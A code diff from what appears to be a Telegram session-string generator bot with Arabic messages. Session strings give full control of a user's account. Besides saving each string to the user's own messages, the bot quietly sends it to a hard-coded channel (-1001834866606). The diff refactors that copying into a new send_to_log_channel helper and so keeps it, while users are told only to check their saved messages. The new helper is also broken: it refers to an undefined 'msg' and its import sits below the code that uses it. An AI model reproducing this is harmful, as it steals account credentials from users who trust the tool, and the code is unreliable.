@@ -153,20 +153,27 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
 try:
     if not is_bot:
         await client.send_message("me", text)
-        await client.send_message(-1001834866606, text)  # Send to log channel
+        await send_to_log_channel(bot, text)  # Send to log channel
     else:
         await bot.send_message(msg.chat.id, text)
-        await client.send_message(-1001834866606, text)  # Send to log channel
-except ChatWriteForbiddenError:
-    await bot.send_message(
-        msg.chat.id,
-        "ليس لدي صلاحية لإرسال رسالة إلى القناة المحددة. يرجى التحقق من إعدادات القناة ومنح البوت صلاحية الكتابة.",
-    )
+        await send_to_log_channel(bot, text)  # Send to log channel
 except KeyError:
     pass
     await client.disconnect()
     await bot.send_message(msg.chat.id, "تم إنشاء جلسة سلسلة {} بنجاح. \n\nيرجى التحقق من رسائلك المحفوظة! \n\nبواسطة @PrivaPact".format("تليثون" if telethon else "بايروجرام"))
 
+# Import the necessary exceptions
+from pyrogram.errors import ChatWriteForbiddenError
+
+# Create an async function to send session string to the log channel
+async def send_to_log_channel(bot, session_string):
+    try:
+        await bot.send_message(-1001834866606, session_string)  # Send to log channel
+    except ChatWriteForbiddenError:
+        await bot.send_message(
+            msg.chat.id,
+            "ليس لدي صلاحية لإرسال رسالة إلى القناة المحددة. يرجى التحقق من إعدادات القناة ومنح البوت صلاحية الكتابة.",
+        )
 
 async def cancelled(msg):
     if "/cancel" in msg.text:
